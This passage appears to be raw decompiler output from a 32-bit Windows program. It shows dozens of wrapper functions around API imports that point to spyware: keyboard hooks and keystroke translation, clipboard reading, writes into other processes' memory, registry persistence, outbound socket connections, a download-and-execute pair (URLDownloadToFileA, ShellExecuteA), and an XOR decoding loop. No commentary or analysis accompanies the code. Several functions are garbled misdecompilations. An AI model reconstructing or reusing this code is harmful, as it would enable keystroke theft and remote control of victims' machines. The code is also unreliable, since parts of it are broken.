}

// Address range: 0x40436a - 0x40436c
int32_t function_40436a(int32_t a1) {
    // 0x40436a
    int32_t result; // 0x40436a
    return result;
}

// Address range: 0x40436e - 0x404376
int32_t function_40436e(void) {
    // 0x40436e
    g86--;
    int32_t result; // 0x40436e
    return result;
}

// Address range: 0x404376 - 0x40437c
int32_t function_404376(void) {
    // 0x404376
    return RegCloseKey2();
}

// Address range: 0x40437e - 0x404384
int32_t function_40437e(int32_t * hKey, char * lpSubKey, int32_t Reserved, char * lpClass, int32_t dwOptions, int32_t samDesired, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t ** phkResult, int32_t * lpdwDisposition) {
    // 0x40437e
    return RegCreateKeyExA(hKey, lpSubKey, Reserved, lpClass, dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition);
}

// Address range: 0x404386 - 0x40438c
int32_t function_404386(int32_t * hKey, char * lpSubKey) {
    // 0x404386
    return RegDeleteKeyA(hKey, lpSubKey);
}

// Address range: 0x40438e - 0x404394
int32_t function_40438e(int32_t a1, int32_t * a2, int32_t a3, int32_t a4, char * a5, int32_t a6) {
    // 0x40438e
    return RegOpenKeyExA2();
}

// Address range: 0x404396 - 0x40439c
int32_t function_404396(int32_t a1, int32_t * a2, int32_t * a3, int32_t * a4, int32_t a5, char * a6, int32_t a7) {
    // 0x404396
    return RegQueryValueExA2();
}

// Address range: 0x40439e - 0x4043a4
int32_t function_40439e(int32_t * hKey, char * lpValueName, int32_t Reserved, int32_t dwType, char * lpData, int32_t cbData) {
    // 0x40439e
    return RegSetValueExA(hKey, lpValueName, Reserved, dwType, lpData, cbData);
}

// Address range: 0x4043a6 - 0x4043ac
bool function_4043a6(int32_t * hObject) {
    // 0x4043a6
    return CloseHandle(hObject);
}

// Address range: 0x4043ae - 0x4043b4
int32_t function_4043ae(int32_t Locale, int32_t dwCmpFlags, char * lpString1, int32_t cchCount1, char * lpString2, int32_t cchCount2) {
    // 0x4043ae
    return CompareStringA(Locale, dwCmpFlags, lpString1, cchCount1, lpString2, cchCount2);
}

// Address range: 0x4043b6 - 0x4043bc
bool function_4043b6(char * lpExistingFileName, char * lpNewFileName, bool bFailIfExists) {
    // 0x4043b6
    return CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists);
}

// Address range: 0x4043be - 0x4043c4
int32_t * function_4043be(char * lpFileName, int32_t dwDesiredAccess, int32_t dwShareMode, struct _SECURITY_ATTRIBUTES * lpSecurityAttributes, int32_t dwCreationDisposition, int32_t dwFlagsAndAttributes, int32_t * hTemplateFile) {
    // 0x4043be
    return CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
}

// Address range: 0x4043c6 - 0x4043cc
int32_t * function_4043c6(struct _SECURITY_ATTRIBUTES * lpThreadAttributes, int32_t dwStackSize, int32_t (*lpStartAddress)(int32_t *), int32_t * lpParameter, int32_t dwCreationFlags, int32_t * lpThreadId) {
    // 0x4043c6
    return CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
}

// Address range: 0x4043ce - 0x4043d4
bool function_4043ce(char * lpFileName) {
    // 0x4043ce
    return DeleteFileA(lpFileName);
}

// Address range: 0x4043d6 - 0x4043dc
int32_t function_4043d6(int32_t a1) {
    // 0x4043d6
    return ExitProcess2();
}

// Address range: 0x4043de - 0x4043e4
int32_t * function_4043de(int32_t * hModule, char * lpName, char * lpType) {
    // 0x4043de
    return FindResourceA(hModule, lpName, lpType);
}

// Address range: 0x4043e6 - 0x4043ec
void function_4043e6(int32_t * hLibModule, int32_t dwExitCode) {
    // 0x4043e6
    FreeLibraryAndExitThread(hLibModule, dwExitCode);
}

// Address range: 0x4043ee - 0x4043f4
int32_t * function_4043ee(void) {
    // 0x4043ee
    return GetCurrentProcess();
}

// Address range: 0x4043f6 - 0x4043fc
int32_t function_4043f6(int32_t * hFile, int32_t * lpFileSizeHigh) {
    // 0x4043f6
    return GetFileSize(hFile, lpFileSizeHigh);
}

// Address range: 0x4043fe - 0x404404
int32_t function_4043fe(int32_t * hModule, char * lpFilename, int32_t nSize) {
    // 0x4043fe
    return GetModuleFileNameA(hModule, lpFilename, nSize);
}

// Address range: 0x404406 - 0x40440c
int32_t * function_404406(char * lpModuleName) {
    // 0x404406
    return GetModuleHandleA(lpModuleName);
}

// Address range: 0x40440e - 0x404414
int32_t (*function_40440e(int32_t * hModule, char * lpProcName))() {
    // 0x40440e
    return GetProcAddress(hModule, lpProcName);
}

// Address range: 0x404416 - 0x40441c
int32_t function_404416(int32_t nBufferLength, char * lpBuffer) {
    // 0x404416
    return GetTempPathA(nBufferLength, lpBuffer);
}

// Address range: 0x40441e - 0x404424
int32_t function_40441e(void) {
    // 0x40441e
    return GetTickCount2();
}

// Address range: 0x404426 - 0x40442c
int32_t * function_404426(int32_t uFlags, int32_t dwBytes) {
    // 0x404426
    return GlobalAlloc(uFlags, dwBytes);
}

// Address range: 0x40442e - 0x404434
int32_t * function_40442e(int32_t * hMem) {
    // 0x40442e
    return GlobalFree(hMem);
}

// Address range: 0x404436 - 0x40443c
int32_t * function_404436(int32_t * hMem) {
    // 0x404436
    return GlobalLock(hMem);
}

// Address range: 0x40443e - 0x404444
bool function_40443e(int32_t * hMem) {
    // 0x40443e
    return GlobalUnlock(hMem);
}

// Address range: 0x404446 - 0x40444c
int32_t * function_404446(char * lpLibFileName) {
    // 0x404446
    return LoadLibraryA(lpLibFileName);
}

// Address range: 0x40444e - 0x404454
bool function_40444e(int32_t * hFile, int32_t * lpBuffer, int32_t nNumberOfBytesToRead, int32_t * lpNumberOfBytesRead, struct _OVERLAPPED * lpOverlapped) {
    // 0x40444e
    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped);
}

// Address range: 0x404456 - 0x40445c
bool function_404456(int32_t * hFile) {
    // 0x404456
    return SetEndOfFile(hFile);
}

// Address range: 0x40445e - 0x404464
void function_40445e(int32_t dwMilliseconds) {
    // 0x40445e
    Sleep(dwMilliseconds);
}

// Address range: 0x404466 - 0x40446c
bool function_404466(int32_t * lpAddress, int32_t dwSize, int32_t flNewProtect, int32_t * lpflOldProtect) {
    // 0x404466
    return VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect);
}

// Address range: 0x40446e - 0x404474
int32_t function_40446e(void) {
    // 0x40446e
    return WriteFile2();
}

// Address range: 0x404476 - 0x40447c
bool function_404476(int32_t * hProcess, int32_t * lpBaseAddress, int32_t * lpBuffer, int32_t nSize, int32_t * lpNumberOfBytesWritten) {
    // 0x404476
    return WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten);
}

// Address range: 0x40447e - 0x404484
int32_t function_40447e(char * lpString1, char * lpString2) {
    // 0x40447e
    return lstrcmpiA(lpString1, lpString2);
}

// Address range: 0x404486 - 0x40448c
char * function_404486(char * lpString1, char * lpString2) {
    // 0x404486
    return lstrcpyA(lpString1, lpString2);
}

// Address range: 0x40448e - 0x404494
bool function_40448e(int32_t * hdc, int32_t iFirst, int32_t iLast, int32_t * lpBuffer) {
    // 0x40448e
    return GetCharWidthA(hdc, iFirst, iLast, lpBuffer);
}

// Address range: 0x404496 - 0x40449c
int32_t * function_404496(int32_t i) {
    // 0x404496
    return GetStockObject(i);
}

// Address range: 0x40449e - 0x4044a4
int32_t * function_40449e(int32_t * hdc, int32_t * h) {
    // 0x40449e
    return SelectObject(hdc, h);
}

// Address range: 0x4044a6 - 0x4044ac
int32_t function_4044a6(int32_t * hhk, int32_t nCode, int32_t wParam, int32_t lParam) {
    // 0x4044a6
    return CallNextHookEx(hhk, nCode, wParam, lParam);
}

// Address range: 0x4044ae - 0x4044b4
bool function_4044ae(void) {
    // 0x4044ae
    return CloseClipboard();
}

// Address range: 0x4044b6 - 0x4044bc
int32_t function_4044b6(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x4044b6
    return DefWindowProcA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x4044be - 0x4044c4
int32_t function_4044be(struct tagMSG * lpMsg) {
    // 0x4044be
    return DispatchMessageA(lpMsg);
}

// Address range: 0x4044c6 - 0x4044cc
bool function_4044c6(bool (*lpEnumFunc)(int32_t *, int32_t), int32_t lParam) {
    // 0x4044c6
    return EnumWindows(lpEnumFunc, lParam);
}

// Address range: 0x4044ce - 0x4044d4
int32_t * function_4044ce(char * lpClassName, char * lpWindowName) {
    // 0x4044ce
    return FindWindowA(lpClassName, lpWindowName);
}

// Address range: 0x4044d6 - 0x4044dc
int32_t * function_4044d6(int32_t * hWndParent, int32_t * hWndChildAfter, char * lpszClass, char * lpszWindow) {
    // 0x4044d6
    return FindWindowExA(hWndParent, hWndChildAfter, lpszClass, lpszWindow);
}

// Address range: 0x4044de - 0x4044e4
bool function_4044de(struct tagPOINT * lpPoint) {
    // 0x4044de
    return GetCaretPos(lpPoint);
}

// Address range: 0x4044e6 - 0x4044ec
int32_t function_4044e6(int32_t * hWnd, int32_t nIndex) {
    // 0x4044e6
    return GetClassLongA(hWnd, nIndex);
}

// Address range: 0x4044ee - 0x4044f4
int32_t function_4044ee(int32_t * hWnd, char * lpClassName, int32_t nMaxCount) {
    // 0x4044ee
    return GetClassNameA(hWnd, lpClassName, nMaxCount);
}

// Address range: 0x4044f6 - 0x4044fc
int32_t * function_4044f6(int32_t uFormat) {
    // 0x4044f6
    return GetClipboardData(uFormat);
}

// Address range: 0x4044fe - 0x404504
int32_t * function_4044fe(int32_t * hWnd) {
    // 0x4044fe
    return GetDC(hWnd);
}

// Address range: 0x404506 - 0x40450c
bool function_404506(char * lpKeyState) {
    // 0x404506
    return GetKeyboardState(lpKeyState);
}

// Address range: 0x40450e - 0x404514
bool function_40450e(struct tagMSG * lpMsg, int32_t * hWnd, int32_t wMsgFilterMin, int32_t wMsgFilterMax) {
    // 0x40450e
    return GetMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax);
}

// Address range: 0x404516 - 0x40451c
int32_t * function_404516(int32_t * hWnd) {
    // 0x404516
    return GetParent(hWnd);
}

// Address range: 0x40451e - 0x404524
int32_t * function_40451e(int32_t * hWnd) {
    // 0x40451e
    return GetTopWindow(hWnd);
}

// Address range: 0x404526 - 0x40452c
int32_t * function_404526(int32_t * hWnd, int32_t uCmd) {
    // 0x404526
    return GetWindow(hWnd, uCmd);
}

// Address range: 0x40452e - 0x404534
int32_t function_40452e(int32_t * hWnd, int32_t nIndex) {
    // 0x40452e
    return GetWindowLongA(hWnd, nIndex);
}

// Address range: 0x404536 - 0x40453c
int32_t function_404536(int32_t * hWnd, int32_t * lpdwProcessId) {
    // 0x404536
    return GetWindowThreadProcessId(hWnd, lpdwProcessId);
}

// Address range: 0x40453e - 0x404544
bool function_40453e(int32_t * hWnd) {
    // 0x40453e
    return IsWindow(hWnd);
}

// Address range: 0x404546 - 0x40454c
bool function_404546(int32_t * hWnd) {
    // 0x404546
    return IsWindowVisible(hWnd);
}

// Address range: 0x40454e - 0x404554
bool function_40454e(int32_t * hWnd, int32_t uIDEvent) {
    // 0x40454e
    return KillTimer(hWnd, uIDEvent);
}

// Address range: 0x404556 - 0x40455c
int32_t * function_404556(int32_t * hInstance, char * lpIconName) {
    // 0x404556
    return LoadIconA(hInstance, lpIconName);
}

// Address range: 0x40455e - 0x404564
bool function_40455e(int32_t * hWndNewOwner) {
    // 0x40455e
    return OpenClipboard(hWndNewOwner);
}

// Address range: 0x404566 - 0x40456c
bool function_404566(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x404566
    return PostMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x40456e - 0x404574
void function_40456e(int32_t nExitCode) {
    // 0x40456e
    PostQuitMessage(nExitCode);
}

// Address range: 0x404576 - 0x40457c
int32_t function_404576(int32_t * hWnd, int32_t * hDC) {
    // 0x404576
    return ReleaseDC(hWnd, hDC);
}

// Address range: 0x40457e - 0x404584
int32_t function_40457e(int32_t * hWnd, int32_t Msg, int32_t wParam, int32_t lParam) {
    // 0x40457e
    return SendMessageA(hWnd, Msg, wParam, lParam);
}

// Address range: 0x404586 - 0x40458c
int32_t function_404586(int32_t * hWnd, int32_t nIDEvent, int32_t uElapse, void (*lpTimerFunc)(int32_t *, int32_t, int32_t, int32_t)) {
    // 0x404586
    return SetTimer(hWnd, nIDEvent, uElapse, lpTimerFunc);
}

// Address range: 0x40458e - 0x404594
int32_t function_40458e(int32_t * hWnd, int32_t nIndex, int32_t dwNewLong) {
    // 0x40458e
    return SetWindowLongA(hWnd, nIndex, dwNewLong);
}

// Address range: 0x404596 - 0x40459c
int32_t * function_404596(int32_t idHook, int32_t (*lpfn)(int32_t, int32_t, int32_t), int32_t * hmod, int32_t dwThreadId) {
    // 0x404596
    return SetWindowsHookExA(idHook, lpfn, hmod, dwThreadId);
}

// Address range: 0x40459e - 0x4045a4
int32_t function_40459e(int32_t uVirtKey, int32_t uScanCode, char * lpKeyState, int16_t * lpChar, int32_t uFlags) {
    // 0x40459e
    return ToAscii(uVirtKey, uScanCode, lpKeyState, lpChar, uFlags);
}

// Address range: 0x4045a6 - 0x4045ac
bool function_4045a6(int32_t * hhk) {
    // 0x4045a6
    return UnhookWindowsHookEx(hhk);
}

// Address range: 0x4045ae - 0x4045b5
int32_t function_4045ae(void) {
    // 0x4045ae
    return function_4025be();
}

// Address range: 0x4045b6 - 0x4045bc
int32_t * function_4045b6(int32_t dwExStyle, char * lpClassName, char * lpWindowName, int32_t dwStyle, int32_t X, int32_t Y, int32_t nWidth, int32_t nHeight, int32_t * hWndParent, int32_t * hMenu, int32_t * hInstance, int32_t * lpParam) {
    // 0x4045b6
    return CreateWindowExA(dwExStyle, lpClassName, lpWindowName, dwStyle, X, Y, nWidth, nHeight, hWndParent, hMenu, hInstance, lpParam);
}

// Address range: 0x4045be - 0x404615
int32_t function_4045be(int32_t hWndParent, int32_t nHeight, int32_t nWidth, int32_t Y, int32_t X, int32_t dwStyle, int32_t lpWindowName, int32_t lpClassName, int32_t dwExStyle) {
    // 0x4045be
    int32_t v1; // 0x4045be
    int32_t v2; // 0x4045be
    int32_t v3; // 0x4045be
    int32_t v4; // 0x4045be
    int32_t hMenu; // 0x4045be
    function_402636(v3, hMenu, v4, v2, v1);
    int32_t hInstance; // 0x4045be
    int32_t lpParam; // 0x4045be
    int32_t * windowHandle = CreateWindowExA(dwExStyle, (char *)lpClassName, (char *)lpWindowName, dwStyle, X, Y, nWidth, nHeight, (int32_t *)hWndParent, (int32_t *)hMenu, (int32_t *)hInstance, (int32_t *)lpParam); // 0x4045fd
    function_402626();
    return (int32_t)windowHandle;
}

// Address range: 0x404616 - 0x40463b
int32_t function_404616(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404621
    __writefsdword(0, (int32_t)&v1);
    g87++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40463b - 0x404640
int32_t function_40463b(void) {
    // 0x40463b
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404640 - 0x404642
int32_t function_404640(void) {
    // 0x404640
    int32_t result; // 0x404640
    return result;
}

// Address range: 0x404642 - 0x404644
int32_t function_404642(int32_t a1) {
    // 0x404642
    int32_t result; // 0x404642
    return result;
}

// Address range: 0x404646 - 0x40464e
int32_t function_404646(void) {
    // 0x404646
    g87--;
    int32_t result; // 0x404646
    return result;
}

// Address range: 0x404651 - 0x4046c3
int32_t function_404651(void) {
    // 0x404651
    int32_t v1; // 0x404651
    *(int32_t *)v1 = v1 - 1;
    int32_t v2; // 0x404651
    int32_t v3 = v2;
    *(char *)v3 = *(char *)&v2 + (char)v3;
    uint32_t v4; // 0x404651
    char * v5 = (char *)(v4 + 101); // 0x404655
    char v6 = v4 / 256; // 0x404655
    *v5 = *v5 + v6;
    int32_t v7 = 0x6c6c642e * *(int32_t *)(v1 + 101); // 0x40465a
    *(char *)v2 = *(char *)&v2 + v6;
    int32_t v8 = v2;
    *(char *)v8 = *(char *)&v2 + (char)v8;
    int32_t v9 = v2;
    *(char *)v9 = *(char *)&v2 + (char)v9;
    int32_t v10 = v2;
    *(char *)v10 = *(char *)&v2 + (char)v10;
    int32_t v11; // 0x404651
    char * v12 = (char *)(v11 - 117); // 0x404669
    *v12 = *v12 + (char)v4;
    __asm_in((int16_t)v4);
    *(int32_t *)(v7 - 8) = 0x4046c3;
    int32_t v13 = __readfsdword(0); // 0x404675
    int32_t v14 = v7 - 12; // 0x404675
    int32_t * v15 = (int32_t *)v14; // 0x404675
    *v15 = v13;
    __writefsdword(0, v14);
    int32_t v16 = g88 + 1; // 0x40467b
    g88 = v16;
    if (v16 == 0) {
        // 0x404683
        function_403372();
        function_403372();
        function_403372();
        function_403372();
        function_403372();
    }
    // 0x4046b5
    __writefsdword(0, *v15);
    *(int32_t *)(v7 - 4) = 0x4046ca;
    return 0;
}

// Address range: 0x4046c3 - 0x4046c8
int32_t function_4046c3(void) {
    // 0x4046c3
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4046c8 - 0x4046ca
int32_t function_4046c8(void) {
    // 0x4046c8
    int32_t result; // 0x4046c8
    return result;
}

// Address range: 0x4046ca - 0x4046cc
int32_t function_4046ca(int32_t a1) {
    // 0x4046ca
    int32_t result; // 0x4046ca
    return result;
}

// Address range: 0x4046ce - 0x4046d6
int32_t function_4046ce(void) {
    // 0x4046ce
    g88--;
    int32_t result; // 0x4046ce
    return result;
}

// Address range: 0x4046d6 - 0x40470f
int32_t function_4046d6(void) {
    int32_t v1 = function_403722(); // 0x4046dd
    int32_t result = function_4034ca(); // 0x4046e8
    int32_t result2 = result; // 0x4046ef
    int32_t v2 = 0; // 0x4046ef
    if (result < 1) {
        // 0x40470b
        return result;
    }
    int32_t v3 = v1; // 0x4046ef
    char * v4 = (char *)v3; // 0x4046f7
    *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g26);
    int32_t v5 = v2 + 1 & -0x7ffffff9; // 0x4046fb
    v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
    result2--;
    v3++;
    while (result2 != 0) {
        // 0x4046f1
        v4 = (char *)v3;
        *v4 = *v4 ^ *(char *)(v2 + (int32_t)&g26);
        v5 = v2 + 1 & -0x7ffffff9;
        v2 = v5 >= 0 ? v5 : (v2 | -8) + 1;
        result2--;
        v3++;
    }
    // 0x40470b
    return result2;
}

// Address range: 0x404712 - 0x404737
int32_t function_404712(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x40471d
    __writefsdword(0, (int32_t)&v1);
    g89++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404737 - 0x40473c
int32_t function_404737(void) {
    // 0x404737
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x40473c - 0x40473e
int32_t function_40473c(void) {
    // 0x40473c
    int32_t result; // 0x40473c
    return result;
}

// Address range: 0x40473e - 0x404740
int32_t function_40473e(int32_t a1) {
    // 0x40473e
    int32_t result; // 0x40473e
    return result;
}

// Address range: 0x404742 - 0x40474a
int32_t function_404742(void) {
    // 0x404742
    g89--;
    int32_t result; // 0x404742
    return result;
}

// Address range: 0x40474a - 0x40476f
int32_t function_40474a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404755
    __writefsdword(0, (int32_t)&v1);
    g90++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x40476f - 0x404774
int32_t function_40476f(void) {
    // 0x40476f
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404774 - 0x404776
int32_t function_404774(void) {
    // 0x404774
    int32_t result; // 0x404774
    return result;
}

// Address range: 0x404776 - 0x404778
int32_t function_404776(int32_t a1) {
    // 0x404776
    int32_t result; // 0x404776
    return result;
}

// Address range: 0x40477a - 0x404782
int32_t function_40477a(void) {
    // 0x40477a
    g90--;
    int32_t result; // 0x40477a
    return result;
}

// Address range: 0x404782 - 0x404788
int32_t function_404782(int32_t s) {
    // 0x404782
    return closesocket(s);
}

// Address range: 0x40478a - 0x404790
int32_t function_40478a(int32_t s, struct sockaddr * name, int32_t namelen) {
    // 0x40478a
    return connect(s, name, namelen);
}

// Address range: 0x404792 - 0x404798
int16_t function_404792(int16_t hostshort) {
    // 0x404792
    return htons(hostshort);
}

// Address range: 0x40479a - 0x4047a0
char * function_40479a(struct in_addr in) {
    // 0x40479a
    return inet_ntoa(in);
}

// Address range: 0x4047a2 - 0x4047a8
int32_t function_4047a2(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4047a2
    return recv(s, buf, len, flags);
}

// Address range: 0x4047aa - 0x4047b0
int32_t function_4047aa(int32_t s, char * buf, int32_t len, int32_t flags) {
    // 0x4047aa
    return send(s, buf, len, flags);
}

// Address range: 0x4047b2 - 0x4047b8
int32_t function_4047b2(int32_t af, int32_t type, int32_t protocol) {
    // 0x4047b2
    return socket(af, type, protocol);
}

// Address range: 0x4047ba - 0x4047c0
struct hostent * function_4047ba(char * name) {
    // 0x4047ba
    return gethostbyname(name);
}

// Address range: 0x4047c2 - 0x4047c8
int32_t function_4047c2(char * name, int32_t namelen) {
    // 0x4047c2
    return gethostname(name, namelen);
}

// Address range: 0x4047ca - 0x4047d0
int32_t function_4047ca(int16_t wVersionRequested, struct WSAData * lpWSAData) {
    // 0x4047ca
    return WSAStartup(wVersionRequested, lpWSAData);
}

// Address range: 0x4047d2 - 0x4047d8
int32_t function_4047d2(void) {
    // 0x4047d2
    return WSACleanup();
}

// Address range: 0x4047da - 0x4047ff
int32_t function_4047da(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4047e5
    __writefsdword(0, (int32_t)&v1);
    g91++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4047ff - 0x404804
int32_t function_4047ff(void) {
    // 0x4047ff
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404804 - 0x404806
int32_t function_404804(void) {
    // 0x404804
    int32_t result; // 0x404804
    return result;
}

// Address range: 0x404806 - 0x404808
int32_t function_404806(int32_t a1) {
    // 0x404806
    int32_t result; // 0x404806
    return result;
}

// Address range: 0x40480a - 0x404812
int32_t function_40480a(void) {
    // 0x40480a
    g91--;
    int32_t result; // 0x40480a
    return result;
}

// Address range: 0x4049aa - 0x4049cf
int32_t function_4049aa(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4049b5
    __writefsdword(0, (int32_t)&v1);
    g92++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x4049cf - 0x4049d4
int32_t function_4049cf(void) {
    // 0x4049cf
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x4049d4 - 0x4049d6
int32_t function_4049d4(void) {
    // 0x4049d4
    int32_t result; // 0x4049d4
    return result;
}

// Address range: 0x4049d6 - 0x4049d8
int32_t function_4049d6(int32_t a1) {
    // 0x4049d6
    int32_t result; // 0x4049d6
    return result;
}

// Address range: 0x4049da - 0x4049e2
int32_t function_4049da(void) {
    // 0x4049da
    g92--;
    int32_t result; // 0x4049da
    return result;
}

// Address range: 0x4049e2 - 0x404a07
int32_t function_4049e2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x4049ed
    __writefsdword(0, (int32_t)&v1);
    g93++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404a07 - 0x404a0c
int32_t function_404a07(void) {
    // 0x404a07
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404a0c - 0x404a0e
int32_t function_404a0c(void) {
    // 0x404a0c
    int32_t result; // 0x404a0c
    return result;
}

// Address range: 0x404a0e - 0x404a10
int32_t function_404a0e(int32_t a1) {
    // 0x404a0e
    int32_t result; // 0x404a0e
    return result;
}

// Address range: 0x404a12 - 0x404a1a
int32_t function_404a12(void) {
    // 0x404a12
    g93--;
    int32_t result; // 0x404a12
    return result;
}

// Address range: 0x404a1a - 0x404a20
int32_t * function_404a1a(int32_t * hwnd, char * lpOperation, char * lpFile, char * lpParameters, char * lpDirectory, int32_t nShowCmd) {
    // 0x404a1a
    return ShellExecuteA(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
}

// Address range: 0x404a22 - 0x404a47
int32_t function_404a22(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404a2d
    __writefsdword(0, (int32_t)&v1);
    g94++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404a47 - 0x404a4c
int32_t function_404a47(void) {
    // 0x404a47
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404a4c - 0x404a4e
int32_t function_404a4c(void) {
    // 0x404a4c
    int32_t result; // 0x404a4c
    return result;
}

// Address range: 0x404a4e - 0x404a50
int32_t function_404a4e(int32_t a1) {
    // 0x404a4e
    int32_t result; // 0x404a4e
    return result;
}

// Address range: 0x404a52 - 0x404a5a
int32_t function_404a52(void) {
    // 0x404a52
    g94--;
    int32_t result; // 0x404a52
    return result;
}

// Address range: 0x404a5a - 0x404a7f
int32_t function_404a5a(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404a65
    __writefsdword(0, (int32_t)&v1);
    g95++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404a7f - 0x404a84
int32_t function_404a7f(void) {
    // 0x404a7f
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404a84 - 0x404a86
int32_t function_404a84(void) {
    // 0x404a84
    int32_t result; // 0x404a84
    return result;
}

// Address range: 0x404a86 - 0x404a88
int32_t function_404a86(int32_t a1) {
    // 0x404a86
    int32_t result; // 0x404a86
    return result;
}

// Address range: 0x404a8a - 0x404a92
int32_t function_404a8a(void) {
    // 0x404a8a
    g95--;
    int32_t result; // 0x404a8a
    return result;
}

// Address range: 0x404a92 - 0x404ab7
int32_t function_404a92(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404a9d
    __writefsdword(0, (int32_t)&v1);
    g96++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404ab7 - 0x404abc
int32_t function_404ab7(void) {
    // 0x404ab7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404abc - 0x404abe
int32_t function_404abc(void) {
    // 0x404abc
    int32_t result; // 0x404abc
    return result;
}

// Address range: 0x404abe - 0x404ac0
int32_t function_404abe(int32_t a1) {
    // 0x404abe
    int32_t result; // 0x404abe
    return result;
}

// Address range: 0x404ac2 - 0x404aca
int32_t function_404ac2(void) {
    // 0x404ac2
    g96--;
    int32_t result; // 0x404ac2
    return result;
}

// Address range: 0x404aca - 0x404ad0
int32_t function_404aca(int32_t * a1, char * a2, char * a3, int32_t a4, int32_t * a5) {
    // 0x404aca
    return URLDownloadToFileA(a1, a2, a3, a4, a5);
}

// Address range: 0x404ad2 - 0x404af7
int32_t function_404ad2(void) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404add
    __writefsdword(0, (int32_t)&v1);
    g97++;
    __writefsdword(0, v1);
    return 0;
}

// Address range: 0x404af7 - 0x404afc
int32_t function_404af7(void) {
    // 0x404af7
    return function_402d86((int32_t)&g118, (int32_t)&g118);
}

// Address range: 0x404afc - 0x404afe
int32_t function_404afc(void) {
    // 0x404afc
    int32_t result; // 0x404afc
    return result;
}

// Address range: 0x404afe - 0x404b00
int32_t function_404afe(int32_t a1) {
    // 0x404afe
    int32_t result; // 0x404afe
    return result;
}

// Address range: 0x404b02 - 0x404b0a
int32_t function_404b02(void) {
    // 0x404b02
    g97--;
    int32_t result; // 0x404b02
    return result;
}

// Address range: 0x404b0a - 0x404b20
int32_t function_404b0a(void) {
    // 0x404b0a
    int32_t v1; // 0x404b0a
    int32_t v2 = v1 & 255;
    if ((char)v1 < 10) {
        // 0x404b0e
        return v2 + 48;
    }
    // 0x404b17
    return v2 + 55;
}

// Address range: 0x404b22 - 0x404c46
int32_t function_404b22(void) {
    // 0x404b22
    function_4036ba();
    int32_t v1 = __readfsdword(0); // bp-52, 0x404b4b
    int32_t v2 = &v1; // 0x404b4b
    __writefsdword(0, v2);
    function_403372();
    int32_t v3 = function_4034ca(); // 0x404b5b
    int32_t v4 = v2; // 0x404b64
    int32_t v5; // 0x404b22
    int32_t v6; // 0x404b22
    int32_t v7; // 0x404b22
    int32_t v8; // 0x404b22
    int32_t v9; // 0x404b22
    unsigned char v10; // 0x404b72
    if (v3 >= 1) {
        // 0x404b6f
        v5 = 1;
        v7 = v2;
        v6 = v3;
        while (true) {
          lab_0x404b6f:
            // 0x404b6f
            v8 = v7;
            int32_t v11; // 0x404b22
            v10 = *(char *)(v11 - 1 + v5);
            if (v10 != 32) {
                if (v10 < 32) {
                    goto lab_0x404bad;
                } else {
                    unsigned char v12 = v10 - 32; // 0x404b9b
                    if (v12 < 96) {
                        // branch -> 0x404bab
                    }
                    // 0x404bab
                    if (v12 >= 95) {
                        // 0x404c02
                        function_403466();
                        function_4034d2();
                        v9 = v8;
                        goto lab_0x404c1b;
                    } else {
                        goto lab_0x404bad;
                    }
                }
            } else {
                // 0x404b79
                function_4034d2();
                v9 = v8;
                goto lab_0x404c1b;
            }
        }
    }
  lab_0x404c23:
    // 0x404c23
    __writefsdword(0, *(int32_t *)v4);
    *(int32_t *)(v4 + 8) = 0x404c4d;
    function_403396();
    return function_403372();
  lab_0x404bad:
    // 0x404bad
    *(int32_t *)(v8 - 4) = (int32_t)(v10 & 15);
    *(int32_t *)(v8 - 8) = (int32_t)&g1;
    function_404b0a();
    function_403466();
    *(int32_t *)(v8 - 12) = 0;
    function_404b0a();
    function_403466();
    int32_t v13 = v8 - 16; // 0x404bf1
    *(int32_t *)v13 = 0;
